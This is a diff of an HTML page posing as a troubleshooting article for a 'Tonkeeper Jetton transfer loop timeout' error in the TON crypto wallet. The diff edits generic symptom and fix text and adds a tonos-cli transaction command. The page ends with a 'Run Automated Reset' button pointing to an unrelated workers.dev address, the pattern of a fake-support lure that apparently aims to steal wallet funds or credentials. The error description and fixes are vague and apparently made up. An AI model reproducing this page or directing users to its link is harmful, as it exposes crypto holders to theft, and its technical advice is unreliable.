@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #121214;
+        font-family: sans-serif;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -41,33 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and frustration.</li>
+<li>The user encounters a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, indicating that the transfer process has exceeded the expected time frame, resulting in a failed transaction.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timeout in the transfer loop, which can be caused by network congestion, high gas fees, or incorrect configuration of the Tonkeeper wallet.</li>
+<li>This error occurs due to a prolonged delay in the confirmation of the transaction on the TON blockchain, which can be caused by network congestion, high gas fees, or issues with the Tonkeeper wallet.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>To resolve the issue, try the following:</li>
 <li>Increase the gas limit to prioritize the transaction</li>
-<li>Reduce the transaction amount to decrease the load on the network</li>
-<li>Update the Tonkeeper wallet to the latest version to ensure compatibility with the TON ecosystem</li>
+<li>Reduce the transaction amount to minimize network fees</li>
+<li>Use an alternative wallet or node to bypass potential Tonkeeper issues</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;gas_limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;amount&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>submitTransaction<span class="w"> </span><span class="s1">&#39;{&quot;dest&quot;:&quot;&lt;recipient_address&gt;&quot;,&quot;value&quot;:&quot;&lt;amount&gt;&quot;,&quot;bounce&quot;:false}&#39;</span><span class="w"> </span>--abi<span class="w"> </span>TonWallet.abi.json
 </code></pre></div>
 
-<p>Consider utilizing an external console to execute these commands for a more streamlined experience.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and to execute the above command. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonkeeper wallet installed and configured</li>
-<li>Sufficient balance of TON coins for gas fees</li>
-<li>Stable internet connection for seamless transactions</li>
+<li>Familiarity with the TON blockchain and its ecosystem</li>
+<li>Access to the Tonkeeper wallet and its configuration settings</li>
+<li>Basic understanding of cryptocurrency transactions and gas fees</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
